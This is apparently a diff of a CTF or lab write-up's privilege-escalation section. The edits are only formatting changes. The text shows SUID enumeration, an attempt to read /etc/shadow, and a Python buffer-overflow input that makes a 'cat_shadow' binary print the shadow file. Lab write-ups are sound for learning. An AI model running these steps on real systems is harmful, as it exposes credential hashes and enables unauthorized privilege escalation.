@@ -40,7 +40,7 @@
 
 ## Privilege Escalation
 
-### sudo -l
+### *sudo -l*
 - **Found nothing of interest (password required)**
 
 ### *find / -perm -u=s -type f 2>/dev/null*
@@ -87,7 +87,7 @@ Trying to cat /etc/shadow
 
 ### Exploiting Buffer Overflow
 - We just need to execute cat_shadow with our exploit string provided as the input password. We know we need to pad the input with 64 A's to overflow the buffer. After that we just need to append the expected hex values. However, due to little-endianness, these values need to be pushed in reverse (maintaining bytes, or hex pairs). Python makes all of this simple:
-  - Target: *./cat_shadow $(python -c "print 'A'*64 + '\\x62\\x59\\x6c\\x49'")*
+  - Target: *./cat_shadow $(python -c "print 'A'\*64 + '\\x62\\x59\\x6c\\x49'")*
 - Exploit successful! The target shadow file is printed to the terminal.
 
 ```bash
